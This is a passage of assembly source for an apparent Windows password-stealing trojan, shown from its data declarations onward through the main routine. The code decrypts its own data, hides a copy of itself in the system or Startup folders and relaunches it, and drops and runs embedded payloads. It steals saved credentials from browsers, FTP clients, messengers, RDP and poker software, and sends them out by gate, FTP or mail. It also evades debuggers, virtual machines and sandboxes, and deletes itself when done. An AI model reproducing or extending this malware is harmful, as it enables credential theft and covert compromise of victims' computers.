      DropDir                   db  ?  ; Drop to Dir      (0/1/2/3)
      
      SleepTimeMs               dd  ?
      
      align 4
      hUrl                      dd  ?
      dwRWurl                   dd  ?
      hInet                     dd  ?
      hFtp                      dd  ?
      pri                       PROCESS_INFORMATION   <>
      sui                       STARTUPINFO           <>
      time                      SYSTEMTIME            <>
      nw                        dd  ?
      hFList                    dd  ?
      ws                        WSADATA               <>
      ca                        sockaddr_in           <>
      mst                       MEMORYSTATUSEX        <>
      ovi                       OSVERSIONINFOEX       <>
      sinfo                     SYSTEM_INFO           <>
      GrabOuterIP               db  ?
      fldr                      db  ?
      
      info                      dd  ?
      dwERead                   dd  ?
      dwETotal                  dd  ?
      dwRes                     dd  ?
      bout                      dd  ?
      hProcess                  dd  ?
      pid                       dd  ?
      ProcListBuf               dd  400h dup (?)
      align 4
      lpSysInfoCommonBuf        db  400h dup (?)
      lpSysInfoCommonValBuf     db  400h dup (?)
      DropFS                    dd  ?
      DropFC                    dd  ?
      DropRunStyle              dd  ?
      DropStructSize            dd  ?
      hDropStruct               dd  ?
      hDropFile                 dd  ?
      DirNameCreateLen          dd  ?
      hDirNameCreate            dd  ?
      FtpDirNameCreateLen       dd  ?
      hFtpDirNameCreate         dd  ?
      GateHostSize              dd  ?
      hGateHost                 dd  ?
      GatePathSize              dd  ?
      hGatePath                 dd  ?
      
      align 4
      stfile                    dd  ?
      stbuf                     dd  ?
      plen                      dd  ?
      SNW                       dd  ?
      DataSize                  dd  ?
      hDC                       dd  ?
      StealTmpBuf1              db  1000h dup (?)
      StealTmpBuf2              db  1000h dup (?)
      UsefulDataSize            dd  ?
      data_type                 db  ?
      RunOrNot                  db  ?
      anubis_buf1               db  400h dup (?)
      vbox_buf1                 db  400h dup (?)
      buf5b                     db  5h dup (?)
      ws_detected               dd  ?
      
      align 4
      ; Anti's
      anti_dbg                  db  ?
      anti_vbox                 db  ?
      anti_ws                   db  ?
      anti_vm                   db  ?
      anti_anubis               db  ?
      anti_sbie                 db  ?
      anti_procexp              db  ?
      anti_procmon              db  ?
      anti_filemon              db  ?
      anti_regmon               db  ?
      anti_StructSize           dd  ?
      anti_hStruct              dd  ?
      align 4
      anti_ProcessesListBuf     dd  1000h dup (?)
      anti_bout                 dd  ?
      anti_pid                  dd  ?
      anti_hProcess             dd  ?
      anti_ModuleName           db  200h dup (?)
      ; Dloader
      dloader_StructSize        dd  ?
      dloader_hStruct           dd  ?
      dloader_TmpPath           db  200h dup (?)
      dloader_SaveTo            db  200h dup (?)
      dloader_9b                db  9h dup (?)
      ; Pwd Protect Data
      align 4
      hPwdKeyMem                dd  ?
      PwdKeySize                dd  ?
      PwdProtAESKeyEncryptBuf   dd  100h dup (?)
      ; SEH
      align 4
      savedfilepointer          dd  ?
      seh                       SEH <>
      
      
.code
; <������ ��� �������� ����������>
                                dd  offset decrypt_start              ; VA ����
                                dd  decrypt_end - decrypt_start       ; ������ ����
; </������ ��� �������� ����������>
; <Relocs>
      reloc_cnt                 dd  4                                 ; Relocs count !!!!!!!!! ------------------->>>>>>>>>>>>>>>>>>>>>>>>>
                                dd  offset gate_send_start            ; VA gate-sending
                                dd  gate_send_end - gate_send_start   ; sizeof
                                dd  offset ftp_send_start             ; VA ftp-sending
                                dd  ftp_send_end - ftp_send_start     ; sizeof
                                dd  offset mail_send_start            ; VA mail-sending
                                dd  mail_send_end - mail_send_start   ; sizeof
                                dd  offset dloader_start              ; VA downloader
                                dd  dloader_end - dloader_start       ; sizeof
                                ;----last-section-it-doesnt-counts----;
                                dd  DATA_END - DATA_START             ; sizeof DATA [important]
; </Relocs>

; <Data XOR key>
      data_xor_key              db  16 dup ('!')
; </Data XOR key>

decrypt_start:
start:
      
; <Decrypt data>
      invoke  Decrypt, offset DATA_START, DATA_END - DATA_START, offset data_xor_key
; </Decrypt data>
      
; <Get some shit>
      call    GetImport
      GetProcessHeap
      mov     hHeap, eax
      GetModuleHandle, 0
      GetModuleFileName, 0, addr cmdl, sizeof cmdl
      call    CreateUniqName
; </Get some shit>
      
; <Get config>
      call    read_opt
; </Get config>
      
; <Drop build to system before stealing>
      movzx   eax, byte ptr [DropDir]
      .if     ( eax == 0 )
              jmp     NoDrop
      .elseif ( eax == 1 )
              GetTempPath, sizeof TmpBuf, addr TmpBuf
      .elseif ( eax == 2 )
              GetSystemDirectory, addr TmpBuf, sizeof TmpBuf
      .elseif ( eax == 3 )
              GetWindowsDirectory, addr TmpBuf, sizeof TmpBuf
      .elseif ( eax == 4 )
              push    1
              push    CSIDL_APPDATA
              push    offset TmpBuf
              push    0
              call    _SHGetSpecialFolderPath
      .elseif ( eax == 5 )
              push    1
              push    CSIDL_STARTUP
              push    offset TmpBuf
              push    0
              call    _SHGetSpecialFolderPath
      .endif
      push    offset TmpBuf
      call    dword ptr [_PathAddBackslash]
      lstrcat, addr TmpBuf, addr wildc
      push    offset TmpBuf
      push    offset cmdl
      call    _PathMatchSpec
      .if     eax == 1
              lstrlen, addr TmpBuf
              add     eax, offset TmpBuf
              mov     byte ptr [eax-1], 0
              SetCurrentDirectory, addr TmpBuf
              jmp     NoDrop
      .endif
      
      lstrlen, addr TmpBuf
      add     eax, offset TmpBuf
      mov     byte ptr [eax-1], 0
      
      push    offset cmdl
      call    _PathFindFileName
      lstrcat, addr TmpBuf, eax
      SetFileAttributes, addr TmpBuf, FILE_ATTRIBUTE_NORMAL
      CopyFile, addr cmdl, addr TmpBuf, 0
      SetFileAttributes, addr TmpBuf, FILE_ATTRIBUTE_HIDDEN or FILE_ATTRIBUTE_SYSTEM
      
      RtlZeroMemory, addr sui, sizeof sui
      RtlZeroMemory, addr pri, sizeof pri
      xor     eax, eax
      CreateProcess, addr TmpBuf, eax, eax, eax, eax, DETACHED_PROCESS, eax, eax, addr sui, addr pri
      
      ; Self-del 'n' exit
      jmp     ERRORZ
    NoDrop:
; </Drop build to system before stealing>
      
; <Only 1 instance>
      CreateMutex, NULL, FALSE, addr MTX_NAME
      GetLastError
      .if     ( eax == 0B7h )
              ExitProcess, 0
      .endif
; </Only 1 instance>
      
; <Sleep before stealing shit>
      Sleep, SleepTimeMs
; </Sleep before stealing shit>
      
; <Create Dir with report>
      lstrcpy, addr const_d, addr cmdl
      push    offset const_d
      call    _PathFindFileName
      mov     byte ptr [eax], 0
      mov     eax, dword ptr [DirNameCreateLen]
      .if     ( eax != 0 )
              lstrcat, addr const_d, hDirNameCreate
              CreateDirectory, addr const_d, NULL              
              movzx   eax, byte ptr [DirHide]
              .if     eax != 0
                      SetFileAttributes, addr const_d, FILE_ATTRIBUTE_HIDDEN
              .endif
      .endif
; </Create Dir with Files>
      
      GetTempPath, sizeof DropPath, addr DropPath

; <Drop Before Search>
      mov     ecx, dword ptr [DropFC]
      test    ecx, ecx
      je      after_search
      mov     eax, dword ptr [DropRunStyle]
      test    eax, eax
      jne     after_search
      mov     ebx, dword ptr [hDropStruct]
    drop_cycle:
      push    ecx
      mov     al, byte ptr [ebx]
      mov     byte ptr [RunOrNot], al
      inc     ebx
      lstrcpy, addr TmpBuf, addr DropPath
      lstrcat, addr TmpBuf, ebx
      lstrlen, ebx
      add     eax, 1
      add     ebx, eax
      mov     eax, dword ptr [ebx]
      add     ebx, 4
      mov     dword ptr [DropFS], eax
      CreateFile, addr TmpBuf, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, NULL, NULL
      mov     hDropFile, eax
      SetFilePointer, hDropFile, 0, 0, FILE_BEGIN
      WriteFile, hDropFile, ebx, DropFS, addr nw, NULL
      CloseHandle, hDropFile
      add     ebx, dword ptr [DropFS]
      mov     al, byte ptr [RunOrNot]
      .if     al == 0
              push    SW_SHOW
              push    0
              push    0
              push    offset TmpBuf
              push    0
              push    0
              call    _ShellExecute
      .endif
      pop     ecx
      dec     ecx
      jnz     drop_cycle
    after_search:
; </Drop Before Search>

      lstrlen, addr FTP_HOST
      .if     ( eax != 0 )
              call    INIT_INET
      .endif
      
      push    offset ws
      push    202h
      call    dword ptr [_WSAStartup]
      
; <�������� ������ �������������� �����>
      call    FillInstalledList
; </�������� ������ �������������� �����>
      
; <��������� ��������>
      call    StealPwds
; </��������� ��������>

; <Drop After Search>
      mov     ecx, dword ptr [DropFC]
      test    ecx, ecx
      je      dont_run
      mov     eax, dword ptr [DropRunStyle]
      cmp     eax, 1
      jne     dont_run
      mov     ebx, dword ptr [hDropStruct]
    drop_cycle_after:
      push    ecx
      mov     al, byte ptr [ebx]
      mov     byte ptr [RunOrNot], al
      inc     ebx
      lstrcpy, addr TmpBuf, addr DropPath
      lstrcat, addr TmpBuf, ebx
      lstrlen, ebx
      add     eax, 1
      add     ebx, eax
      mov     eax, dword ptr [ebx]
      add     ebx, 4
      mov     dword ptr [DropFS], eax
      CreateFile, addr TmpBuf, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, NULL, NULL
      mov     hDropFile, eax
      SetFilePointer, hDropFile, 0, 0, FILE_BEGIN
      WriteFile, hDropFile, ebx, DropFS, addr nw, NULL
      CloseHandle, hDropFile
      add     ebx, dword ptr [DropFS]
      mov     al, byte ptr [RunOrNot]
      .if     al == 0
              push    SW_SHOW
              push    0
              push    0
              push    offset TmpBuf
              push    0
              push    0
              call    _ShellExecute
      .endif
      pop     ecx
      dec     ecx
      jnz     drop_cycle_after
    dont_run:
; </Drop After Search>
      
      cmp     dword ptr [dloader_StructSize], 0
      je      dont_load_files
      call    Dloader_Routine
    dont_load_files:
      
    ERRORZ:
      
      lstrlen, addr FTP_HOST
      .if     ( eax != 0 )
              call    DEINIT_INET
      .endif
      movzx   eax, byte ptr [SelfDel]
      .if     ( eax == 1 )
              call    SelfDelete
      .endif
      
    FatalError:
      ExitProcess, 0

; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      include functions.asm
      include selfdelete.asm
      include ftp.asm
      include readopt.asm
      include mail.asm
      include gate.asm
      include noimport.asm
      include crc32.asm
      include antis.asm
      include downloader.asm
; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      include stealer.asm
      include stealers\WinSCP.asm
      include stealers\FullTiltPoker.asm
      include stealers\PokerStars.asm
      include stealers\RDP.asm
      include stealers\IncrediMail.asm
      include stealers\RAS.asm
      include stealers\WSFTP.asm
      include stealers\CoreFTP.asm
      include stealers\Psi.asm
      include stealers\Safari.asm
      include stealers\QIP2005.asm
      include stealers\ChromiumBased.asm
      include stealers\GTalk.asm
      include stealers\SmartFTP.asm
      include stealers\TheBat.asm
      include stealers\FAR.asm
      include stealers\ICQ.asm
      include stealers\MagentBased.asm
      include stealers\Opera.asm
      include stealers\MozillaBased.asm
      include stealers\Miranda.asm
      include stealers\Live.asm
      include stealers\FileZilla.asm
      include stealers\FlashFXP.asm
      include stealers\IE.asm
      include stealers\WTC.asm
      include stealers\Pidgin.asm
      include stealers\QIP_Infium.asm
      include stealers\sysinfo.asm
; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

decrypt_end:
  db 200h dup (00)

end start